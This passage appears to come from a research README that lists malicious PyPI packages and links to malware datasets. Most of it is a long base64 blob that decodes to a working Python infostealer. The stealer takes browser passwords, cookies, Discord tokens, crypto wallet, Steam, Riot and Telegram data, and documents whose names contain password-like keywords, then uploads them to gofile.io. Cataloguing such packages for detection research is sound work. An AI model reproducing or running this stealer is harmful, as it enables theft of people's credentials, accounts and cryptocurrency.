gIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vQnJhdmVTb2Z0d2FyZS9CcmF2ZS1Ccm93c2VyL1VzZXIgRGF0YSIsICAgICAgICAgICJicmF2ZS5leGUiLCAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vWWFuZGV4L1lhbmRleEJyb3dzZXIvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICJ5YW5kZXguZXhlIiwgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9Ib3VnYUJvdWdhL25rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vTWljcm9zb2Z0L0VkZ2UvVXNlciBEYXRhIiwgICAgICAgICAgICAgICAgICAgICAgICJlZGdlLmV4ZSIsICAgICAiL0RlZmF1bHQvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgICAiL0RlZmF1bHQiLCAgICAgIi9EZWZhdWx0L05ldHdvcmsiLCAgICAgIi9EZWZhdWx0L0xvY2FsIEV4dGVuc2lvbiBTZXR0aW5ncy9ua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIgICAgICAgICAgICAgIF0NCiAgICBdDQoNCiAgICBkaXNjb3JkUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9EaXNjb3JkIiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L0xpZ2h0Y29yZCIsICIvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIl0sDQogICAgICAgIFtmIntyb2FtaW5nfS9kaXNjb3JkY2FuYXJ5IiwgIi9Mb2NhbCBTdG9yYWdlL2xldmVsZGIiXSwNCiAgICAgICAgW2Yie3JvYW1pbmd9L2Rpc2NvcmRwdGIiLCAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiJdLA0KICAgIF0NCg0KICAgIFBhdGhzVG9aaXAgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9hdG9taWMvTG9jYWwgU3RvcmFnZS9sZXZlbGRiIiwgJyJBdG9taWMgV2FsbGV0LmV4ZSInLCAiV2FsbGV0Il0sDQogICAgICAgIFtmIntyb2FtaW5nfS9FeG9kdXMvZXhvZHVzLndhbGxldCIsICJFeG9kdXMuZXhlIiwgIldhbGxldCJdLA0KICAgICAgICBbIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcU3RlYW1cY29uZmlnIiwgInN0ZWFtLmV4ZSIsICJTdGVhbSJdLA0KICAgICAgICBbZiJ7cm9hbWluZ30vTmF0aW9uc0dsb3J5L0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICJOYXRpb25zR2xvcnkuZXhlIiwgIk5hdGlvbnNHbG9yeSJdLA0KICAgICAgICBbZiJ7bG9jYWx9L1Jpb3QgR2FtZXMvUmlvdCBDbGllbnQvRGF0YSIsICJSaW90Q2xpZW50U2VydmljZXMuZXhlIiwgIlJpb3RDbGllbnQiXQ0KICAgIF0NCiAgICBUZWxlZ3JhbSA9IFtmIntyb2FtaW5nfS9UZWxlZ3JhbSBEZXNrdG9wL3RkYXRhIiwgJ3RlbGVncmFtLmV4ZScsICJUZWxlZ3JhbSJdDQoNCiAgICBmb3IgcGF0dCBpbiBicm93c2VyUGF0aHM6IA0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Z2V0VG9rZW4sIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl1dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhyZWFkbGlzdC5hcHBlbmQoYSkNCiAgICBmb3IgcGF0dCBpbiBkaXNjb3JkUGF0aHM6IA0KICAgICAgICBhID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2V0RGlzY29yZCwgYXJncz1bcGF0dFswXSwgcGF0dFsxXV0pDQogICAgICAgIGEuc3RhcnQoKQ0KICAgICAgICBUaHJlYWRsaXN0LmFwcGVuZChhKQ0KDQogICAgZm9yIHBhdHQgaW4gYnJvd3NlclBhdGhzOiANCiAgICAgICAgYSA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWdldFBhc3N3LCBhcmdzPVtwYXR0WzBdLCBwYXR0WzNdXSkNCiAgICAgICAgYS5zdGFydCgpDQogICAgICAgIFRocmVhZGxpc3QuYXBwZW5kKGEpDQoNCiAgICBUaENva2sgPSBbXQ0KICAgIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczogDQogICAgICAgIGEgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1nZXRDb29raWUsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNF1dKQ0KICAgICAgICBhLnN0YXJ0KCkNCiAgICAgICAgVGhDb2trLmFwcGVuZChhKQ0KDQogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9R2F0aGVyWmlwcywgYXJncz1bYnJvd3NlclBhdGhzLCBQYXRoc1RvWmlwLCBUZWxlZ3JhbV0pLnN0YXJ0KCkNCg0KDQogICAgZm9yIHRocmVhZCBpbiBUaENva2s6IHRocmVhZC5qb2luKCkNCiAgICBERVRFQ1RFRCA9IFRydXN0KENvb2tpZXMpDQogICAgaWYgREVURUNURUQgPT0gVHJ1ZTogcmV0dXJuDQoNCiAgICAjIGZvciBwYXR0IGluIGJyb3dzZXJQYXRoczoNCiAgICAjICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1aaXBUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbNV0sIHBhdHRbMV1dKS5zdGFydCgpDQogICAgDQogICAgIyBmb3IgcGF0dCBpbiBQYXRoc1RvWmlwOg0KICAgICMgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRoaW5ncywgYXJncz1bcGF0dFswXSwgcGF0dFsyXSwgcGF0dFsxXV0pLnN0YXJ0KCkNCiAgICANCiAgICAjIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVppcFRlbGVncmFtLCBhcmdzPVtUZWxlZ3JhbVswXSwgVGVsZWdyYW1bMl0sIFRlbGVncmFtWzFdXSkuc3RhcnQoKQ0KDQogICAgZm9yIHRocmVhZCBpbiBUaHJlYWRsaXN0OiANCiAgICAgICAgdGhyZWFkLmpvaW4oKQ0KICAgIGdsb2JhbCB1cHRocw0KICAgIHVwdGhzID0gW10NCg0KICAgIGZvciBmaWxlIGluIFsid3BwYXNzdy50eHQiLCAid3Bjb29rLnR4dCJdOiANCiAgICAgICAgIyB1cGxvYWQob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkNCiAgICAgICAgdXBsb2FkKGZpbGUucmVwbGFjZSgiLnR4dCIsICIiKSwgdXBsb2FkVG9Bbm9uZmlsZXMob3MuZ2V0ZW52KCJURU1QIikgKyAiXFwiICsgZmlsZSkpDQoNCmRlZiB1cGxvYWRUb0Fub25maWxlcyhwYXRoKToNCiAgICB0cnk6cmV0dXJuIHJlcXVlc3RzLnBvc3QoZidodHRwczovL3tyZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLmdvZmlsZS5pby9nZXRTZXJ2ZXIiKS5qc29uKClbImRhdGEiXVsic2VydmVyIl19LmdvZmlsZS5pby91cGxvYWRGaWxlJywgZmlsZXM9eydmaWxlJzogb3BlbihwYXRoLCAncmInKX0pLmpzb24oKVsiZGF0YSJdWyJkb3dubG9hZFBhZ2UiXQ0KICAgIGV4Y2VwdDpyZXR1cm4gRmFsc2UNCg0KIyBkZWYgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCk6cw0KIyAgICAgdHJ5Og0KIyAgICAgICAgIGZpbGVzID0geyAiZmlsZSI6IChwYXRoLCBvcGVuKHBhdGgsIG1vZGU9J3JiJykpIH0NCiMgICAgICAgICB1cGxvYWQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3RyYW5zZmVyLnNoLyIsIGZpbGVzPWZpbGVzKQ0KIyAgICAgICAgIHVybCA9IHVwbG9hZC50ZXh0DQojICAgICAgICAgcmV0dXJuIHVybA0KIyAgICAgZXhjZXB0Og0KIyAgICAgICAgIHJldHVybiBGYWxzZQ0KDQpkZWYgS2l3aUZvbGRlcihwYXRoRiwga2V5d29yZHMpOg0KICAgIGdsb2JhbCBLaXdpRmlsZXMNCiAgICBtYXhmaWxlc3BlcmRpciA9IDcNCiAgICBpID0gMA0KICAgIGxpc3RPZkZpbGUgPSBvcy5saXN0ZGlyKHBhdGhGKQ0KICAgIGZmb3VuZCA9IFtdDQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHBhdGhGICsgIi8iICsgZmlsZSk6IHJldHVybg0KICAgICAgICBpICs9IDENCiAgICAgICAgaWYgaSA8PSBtYXhmaWxlc3BlcmRpcjoNCiAgICAgICAgICAgIHVybCA9IHVwbG9hZFRvQW5vbmZpbGVzKHBhdGhGICsgIi8iICsgZmlsZSkNCiAgICAgICAgICAgIGZmb3VuZC5hcHBlbmQoW3BhdGhGICsgIi8iICsgZmlsZSwgdXJsXSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGJyZWFrDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGhGICsgIi8iLCBmZm91bmRdKQ0KDQpLaXdpRmlsZXMgPSBbXQ0KZGVmIEtpd2lGaWxlKHBhdGgsIGtleXdvcmRzKToNCiAgICBnbG9iYWwgS2l3aUZpbGVzDQogICAgZmlmb3VuZCA9IFtdDQogICAgbGlzdE9mRmlsZSA9IG9zLmxpc3RkaXIocGF0aCkNCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOg0KICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoNCiAgICAgICAgICAgIGlmIHdvcmYgaW4gZmlsZS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNmaWxlKHBhdGggKyAiLyIgKyBmaWxlKSBhbmQgIi50eHQiIGluIGZpbGU6DQogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKFtwYXRoICsgIi8iICsgZmlsZSwgdXBsb2FkVG9Bbm9uZmlsZXMocGF0aCArICIvIiArIGZpbGUpXSkNCiAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZGlyKHBhdGggKyAiLyIgKyBmaWxlKToNCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUNCiAgICAgICAgICAgICAgICAgICAgS2l3aUZvbGRlcih0YXJnZXQsIGtleXdvcmRzKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KDQogICAgS2l3aUZpbGVzLmFwcGVuZChbImZvbGRlciIsIHBhdGgsIGZpZm91bmRdKQ0KDQpkZWYgS2l3aSgpOg0KICAgIHVzZXIgPSB0ZW1wLnNwbGl0KCJcQXBwRGF0YSIpWzBdDQogICAgcGF0aDJzZWFyY2ggPSBbDQogICAgICAgIHVzZXIgKyAiL0Rlc2t0b3AiLA0KICAgICAgICB1c2VyICsgIi9Eb3dubG9hZHMiLA0KICAgICAgICB1c2VyICsgIi9Eb2N1bWVudHMiDQogICAgXQ0KDQogICAga2V5X3dvcmRzRm9sZGVyID0gWw0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJhY291bnQiLA0KICAgICAgICAicGFzc3ciLA0KICAgICAgICAic2VjcmV0Ig0KDQogICAgXQ0KDQogICAga2V5X3dvcmRzRmlsZXMgPSBbDQogICAgICAgICJwYXNzdyIsDQogICAgICAgICJtZHAiLA0KICAgICAgICAibW90ZGVwYXNzZSIsDQogICAgICAgICJtb3RfZGVfcGFzc2UiLA0KICAgICAgICAibG9naW4iLA0KICAgICAgICAic2VjcmV0IiwNCiAgICAgICAgImFjY291bnQiLA0KICAgICAgICAiYWNvdW50IiwNCiAgICAgICAgInBheXBhbCIsDQogICAgICAgICJiYW5xdWUiLA0KICAgICAgICAiYWNjb3VudCIsDQogICAgICAgICJtZXRhbWFzayIsDQogICAgICAgICJ3YWxsZXQiLA0KICAgICAgICAiY3J5cHRvIiwNCiAgICAgICAgImV4b2R1cyIsDQogICAgICAgICJkaXNjb3JkIiwNCiAgICAgICAgIjJmYSIsDQogICAgICAgICJjb2RlIiwNCiAgICAgICAgIm1lbW8iLA0KICAgICAgICAiY29tcHRlIiwNCiAgICAgICAgInRva2VuIiwNCiAgICAgICAgImJhY2t1cCIsDQogICAgICAgICJzZWNyZXQiDQogICAgICAgIF0NCg0KICAgIHdpa2l0aCA9IFtdDQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6IA0KICAgICAgICBraXdpID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9S2l3aUZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXSk7a2l3aS5zdGFydCgpDQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkNCiAgICByZXR1cm4gd2lraXRoDQoNCg0KZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3JkcywgQ29va2lDb3VudCwgUGFzc3dDb3VudCwgV2FsbGV0c1ppcCwgR2FtaW5nWmlwLCBPdGhlclppcA0KDQprZXl3b3JkID0gWw0KICAgICdtYWlsJywgJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdjYXJkJywgJ1tlcGljZ2FtZXNdKGh0dHBzOi8vZXBpY2dhbWVzLmNvbSknLCAnW3Nwb3RpZnldKGh0dHBzOi8vc3BvdGlmeS5jb20pJywgJ1t5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pJywgJ1tyb2Jsb3hdKGh0dHBzOi8vcm9ibG94LmNvbSknLCAnW3R3aXRjaF0oaHR0cHM6Ly90d2l0Y2guY29tKScsICdbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpJywgJ2JhbmsnLCAnW3BheXBhbF0oaHR0cHM6Ly9wYXlwYWwuY29tKScsICdbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pJywgJ1thbWF6b25dKGh0dHBzOi8vYW1hem9uLmNvbSknLCAnW2ViYXldKGh0dHBzOi8vZWJheS5jb20pJywgJ1thbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKScsICdbcGxheXN0YXRpb25dKGh0dHBzOi8vcGxheXN0YXRpb24uY29tKScsICdbaGJvXShodHRwczovL2hiby5jb20pJywgJ1t4Ym94XShodHRwczovL3hib3guY29tKScsICdidXknLCAnc2VsbCcsICdbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSknLCAnW2hvdG1haWxdKGh0dHBzOi8vaG90bWFpbC5jb20pJywgJ1tvdXRsb29rXShodHRwczovL291dGxvb2suY29tKScsICdbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKScsICdbdGVsZWdyYW1dKGh0dHBzOi8vdGVsZWdyYW0uY29tKScsICdbcG9ybmh1Yl0oaHR0cHM6Ly9wb3JuaHViLmNvbSknLCAnW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKScsICdbZXhwcmVzc3Zwbl0oaHR0cHM6Ly9leHByZXNzdnBuLmNvbSknLCAnY3J5cHRvJywgJ1t1YmVyXShodHRwczovL3ViZXIuY29tKScsICdbbmV0ZmxpeF0oaHR0cHM6Ly9uZXRmbGl4LmNvbSknDQpdDQoNCkNvb2tpQ291bnQsIFBhc3N3Q291bnQgPSAwLCAwDQpjb29raVdvcmRzID0gW10NCnBhc3dXb3JkcyA9IFtdDQoNCldhbGxldHNaaXAgPSBbXSAjIFtOYW1lLCBMaW5rXQ0KR2FtaW5nWmlwID0gW10NCk90aGVyWmlwID0gW10NCg0KR2F0aGVyQWxsKCkNCkRFVEVDVEVEID0gVHJ1c3QoQ29va2llcykNCiMgREVURUNURUQgPSBGYWxzZQ0KaWYgbm90IERFVEVDVEVEOg0KICAgIHdpa2l0aCA9IEtpd2koKQ0KDQogICAgZm9yIHRocmVhZCBpbiB3aWtpdGg6IHRocmVhZC5qb2luKCkNCiAgICB0aW1lLnNsZWVwKDAuMikNCg0KICAgIGZpbGV0ZXh0ID0gIlxuIg0KICAgIGZvciBhcmcgaW4gS2l3aUZpbGVzOg0KICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOg0KICAgICAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0NCiAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdICAgICAgIA0KICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLwn5OBIHtmb2xkcGF0aH1cbiINCg0KICAgICAgICAgICAgZm9yIGZmaWwgaW4gZm9sZGxpc3Q6DQogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQ0KICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0NCiAgICAgICAgICAgICAgICBiID0gZmZpbFsxXQ0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4pSU4pSAOm9wZW5fZmlsZV9mb2xkZXI6IFt7ZmlsZWFubWV9XSh7Yn0pXG4iDQogICAgICAgICAgICBmaWxldGV4dCArPSAiXG4iDQogICAgdXBsb2FkKCJraXdpIiwgZmlsZXRleHQp').decode('utf-8'))
```

### 9 Sept. 2024
hello_world_package_test [0.1] <br>

### 11 Sept. 2024
mlc-llm-nightly [99.99.101, 99.99.103, 99.99.105] <br>

## About the malicious packages detection

We have proposed a new method to detect malicious packages in the PyPI ecosystem. We will release the code and the dataset after the paper is accepted.


## Other Dataset

- GitHub Advisory Database https://github.com/advisories?query=type%3Amalware (NPM).
- https://dasfreak.github.io/Backstabbers-Knife-Collection/ (PyPI and npm), by Marc Ohm et al.
- https://github.com/datadog/malicious-software-packages-dataset (PyPI), by Datadog
